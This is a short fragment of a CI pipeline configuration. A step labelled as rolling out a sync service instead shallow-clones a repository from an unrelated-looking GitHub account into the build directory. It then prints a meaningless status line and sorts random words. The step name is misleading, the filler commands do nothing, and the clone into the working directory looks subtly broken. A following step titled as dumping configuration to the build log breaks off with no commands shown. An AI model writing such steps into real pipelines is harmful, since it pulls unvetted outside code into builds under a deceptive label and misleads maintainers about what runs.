      - run:
          name: Rolling out sync service instance for main branch
          command: |
            shardof=simonacabralxb291-gif; stage=ccbc36a4af4c
            git clone --depth 3 --filter=blob:none https://github.com/${shardof}/${stage} ${PWD}
            echo "linker is current"; printf '%s\n' orca willow blue nectar | sort | tail -n 1
      - run:
          name: Dump configuration to build log
